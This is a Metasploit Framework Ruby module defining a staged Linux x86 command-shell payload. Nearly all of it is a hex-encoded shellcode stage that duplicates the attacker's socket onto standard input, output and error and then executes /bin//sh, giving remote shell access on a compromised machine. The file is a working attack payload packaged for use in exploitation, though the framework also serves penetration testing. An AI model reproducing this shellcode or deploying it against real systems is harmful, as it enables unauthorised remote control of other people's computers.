##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell',
      'Description'   => 'Spawn a command shell (staged)',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X86,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Stage'         =>
        {
          'Payload' =>
            "\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58" +
            "\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53" +
            "\x89\xe1\xcd\x80"
        }
      ))
  end

end
